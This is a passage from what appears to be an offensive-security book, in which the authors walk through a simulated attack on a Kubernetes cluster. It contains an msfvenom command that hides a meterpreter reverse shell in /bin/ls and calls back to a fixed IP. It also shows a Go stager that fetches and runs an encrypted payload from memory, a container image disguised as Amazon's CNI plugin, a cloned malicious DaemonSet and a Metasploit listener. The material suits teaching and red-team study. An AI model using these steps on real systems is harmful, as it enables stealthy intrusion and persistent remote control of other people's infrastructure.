- pgno: 176
  md: 'Since MXR Ads is such a big fan of S3, we pull the future binary from an S3
    bucket we own, which we''ve treacherously called amazon-cni-plugin-essentials
    (more on the name later).


    The binary (also called an agent) can be any of your favorite custom or boilerplate
    reverse shells. Some hackers may not even mind running a vanilla meterpreter agent
    on a Linux box. As stated in Chapter 1, the attacking framework we''ve built is
    reliable and stable, and few companies bother to invest in costly endpoint detection
    response solutions to protect their Linux servers, especially in ephemeral machines
    in a Kubernetes cluster. That makes off-the-shelf exploitation frameworks like
    Metasploit a reasonable option.


    Nevertheless, we''ll stay on the side of caution and take a few seconds to build
    a reliable payload unlikely to trip over hidden wires.


    We head to our lab and generate a stageless vanilla HTTPS meterpreter. A stageless
    payload is one that is fully self-contained and doesn''t need to download additional
    code from the internet to start. The meterpreter is directly injected into the
    executable .text section of the ELF/PE binary of our choosing (provided the template
    file has enough space for it). In Listing 9-3, we choose the /bin/ls binary as
    a template and sneak the reverse shell into it.


    ```

    root@Point1:~# docker run -it phoce an/msf ./msfvenom -p \

    linux/x64/meterpreter_reverse_https \

    LHOST=54.229.96.173 \

    LURI=/msf \

    -x /bin/ls \

    LPORT=443 -f elf > /opt/tmp/stager


    [*] Writing 1046512 bytes to /opt/tmp/stager...

    ```


    Listing 9-3: Embedding a meterpreter inside a regular /bin/ls executable


    Simple enough. Now, instead of running this file from disk like any classic binary,
    we would like to trigger its execution exclusively from memory to thwart potential
    security solutions. Had the payload been a regular shellcode instead of a literal
    binary file, we would only have needed to copy it to a read/write/execute memory
    page and then jump to the first byte of the payload.


    However, since our meterpreter_reverse_https payload produces a full ELF binary
    file, reflectively loading it in memory requires a bit of extra work: we have
    to manually load imported DLLs and resolve local offsets. Check the resources
    at the end of the chapter for more on how to handle this. Thankfully, Linux 3.17
    introduced a syscall tool that provides a much quicker way of achieving the same
    result: memfd.


    This syscall creates a virtual file that lives entirely in memory and behaves
    like any regular disk file. Using the virtual file''s symbolic link /proc/self/fd/<id>,
    we can open the virtual file, alter it, truncate it, and, of course, execute it!'
  merge: -1
  img_proc: true
- pgno: 177
  md: "Here are the five main steps to carry out this operation:\n\n+   1. Encrypt\
    \ the vanilla meterpreter payload using an XOR operation.\n2. Store the result\
    \ in an S3 bucket.\n3. Craft a stager that will download the encrypted payload\
    \ over HTTPS on the target machine.\n4. Decrypt the payload in memory and initialize\
    \ an “anonymous” file using the memfd syscall.\n5. Copy the decrypted payload\
    \ into this memory-only file and then execute it.\n\nListing 9-4 is an abridged\
    \ walkthrough of the main steps our stager will take—as usual, the full code is\
    \ hosted on GitHub.\n\n```\nfunc main() {\n    // Download the encrypted meterpreter\
    \ payload\n    data, err := getURLContent(path)\n\n    // Decrypt it using XOR\
    \ operation\n    decryptedData := decryptXor(data, []byte(\"verylongkey\"))\n\n\
    \    // Create an anonymous file in memory\n    mfd, err := memfd.Create()\n\n\
    \    // Write the decrypted payload to the file\n    mfd.Write(decryptedData)\n\
    \n    // Get the symbolic link to the file\n    filePath := fmt.Sprintf(\"/proc/self/fd/%d\"\
    , mfd.Fd())\n\n    // Execute the file\n    cmd := exec.Command(filePath)\n  \
    \  out, err := cmd.Run()\n}\n```\n\nListing 9-4: High-level actions of the stager\n\
    \nThat’s about it. We don’t need to do any obscure offset calculations, library\
    \ hot-loading, patching of procedure linkage table (PLT) sections, or other hazardous\
    \ tricks. We have a reliable stager that executes a file exclusively in memory\
    \ and that is guaranteed to work on any recent Linux distribution.\n\nWe compile\
    \ the code and then upload it to S3:\n\n```\nroot@Point1:opt/tmp# aws s3api put-object\
    \ \\\n--key run \\\n--bucket amazon-cni-plugin-essentials \\\n--body ./run\n```"
  merge: -1
  img_proc: true
- pgno: 178
  md: 'Finally, to further enhance the web of deceit, when we build the container’s
    image and push it to our own AWS ECR registry (ECR is the equivalent of Docker
    Hub on AWS), we do so under the guise of a legitimate Amazon container, amazon-k8s-cni:


    ```

    root@Point1:~/# docker build \

    -t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .


    Successfully built be905757d9aa

    Successfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3


    # Authenticate to ECR

    root@Point1:~/# $(aws ecr get-login --no-include-email --region eu-west-1)

    root@Point1:~/# docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3

    ```


    The names of the fake container (amazon-k8s-cni) and S3 bucket (amazon-cni-plugin-essentials)
    are not arbitrary choices. EKS runs a copy of a similar container on every single
    node to manage the network configuration of pods and nodes, as we can see if we
    grab a list of pods from any running cluster:


    ```

    shell> kubectl get pods -n kube-system | grep aws-node

    aws-node-rb8n2      1/1     Running   0   7d

    aws-node-rs9d1      1/1     Running   0   23h

    --snip--

    ```


    These pods named aws-node-xxxx are running the official amazon-k8s-cni image hosted
    on AWS’s own repository.


    These pods were created by a DaemonSet object, a Kubernetes resource that maintains
    at least one copy of a given pod constantly running on all (or some) nodes. Each
    of these aws-node pods is assigned a service account with read-only access to
    all namespaces, nodes, and pods. And to top it all off, they all automatically
    mount /var/run/docker.sock, giving them root privileges on the host. It is the
    perfect cover.


    We will spawn an almost exact copy of this DaemonSet. Unlike the real one, however,
    this new DaemonSet will fetch its amazon-k8s-cni pod image from our own ECR repository.
    A DaemonSet runs by default on all machines. We do not want to end up with thousands
    of reverse shells phoning home at once, so we will only target a few nodes—for
    instance, the three bearing the “kafka-broker-collector” label. This is a good
    population size for our evil DaemonSet.


    The following command displays machine names along with their labels:


    ```

    shell> kubectl get nodes --show-labels


    ip-192-168-178-150.eu-west-1.compute.internal


    service=kafka-broker-collector,

    beta.kubernetes.io/arch=amd64,

    beta.kubernetes.io/instance-type=t2.small, beta.kubernetes.io/os=linux

    ```'
  merge: -1
  img_proc: true
- pgno: 179
  md: '```

    ip-192-168-178-150.eu-west-1.compute.internal

    --snip--

    ip-192-168-178-150.eu-west-1.compute.internal

    --snip--

    ```


    We have chosen our targets. Our payload is locked and ready. The next step is
    to create the DaemonSet object.


    No need to go looking for the YAML definition of a DaemonSet; we just dump the
    DaemonSet used by the legitimate aws-node, update the container image field so
    it points to our own repository, alter the display name (aws-node-cni instead
    of aws-node), change the container port to avoid conflict with the existing DaemonSet,
    and finally add the label selector to match kafka-broker-collector. In Listing
    9-5, we resubmit the newly changed file for scheduling.


    ```

    shell> kubectl get DaemonSet aws-node -o yaml -n kube-system > aws-ds-manifest.yaml


    # Replace the container image with our own image

    shell> sed -E "s/image: .* /image: 886477354405.dkr.ecr.eu-west-1.amazonaws.com/\namazon-k8s-cni:v1.5.3/g"
    -i aws-ds-manifest.yaml


    # Replace the name of the DaemonSet

    shell> sed "s/ name: aws-node/ name: aws-node-cni/g" -i aws-ds-manifest.yaml


    # Replace the host and container port to avoid conflict

    shell> sed -E "s/Port: [0-9]+/Port: 12711/g" -i aws-ds-manifest.yaml


    # Update the node label key and value

    shell> sed "s/ key: beta.kubernetes.io/os/ key: service/g" -i aws-ds-manifest.yaml


    shell> sed "s/ linux/ kafka-broker-collector/g" -i aws-ds-manifest.yaml

    ```


    Listing 9-5: Creating our own fake DaemonSet


    After a few sed commands, we have our updated manifest ready to be pushed to the
    API server.


    Meanwhile, we head back to our Metasploit container to set up a listener serving
    a payload of type meterpreter_reverse_https on port 443, as shown next. This payload
    type is, of course, the same one we used in the msfvenom command at the beginning
    of this chapter:


    ```

    root@Point1:~# docker ps

    CONTAINER ID   IMAGE        COMMAND

    8e4adacc6e61   phocean/msf  " /bin/sh -c \"init.sh\""


    root@Point1:~# docker attach 8e4adacc6e61

    root@fcd4030:/opt/metasploit-framework# ./msfconsole

    msf > use exploit/multi/handler

    msf multi/handler> set payload linux/x64/meterpreter_reverse_https

    msf multi/handler> set LPORT 443

    msf multi/handler> set LHOST 0.0.0.0

    msf multi/handler> set LURI /msf

    ```'
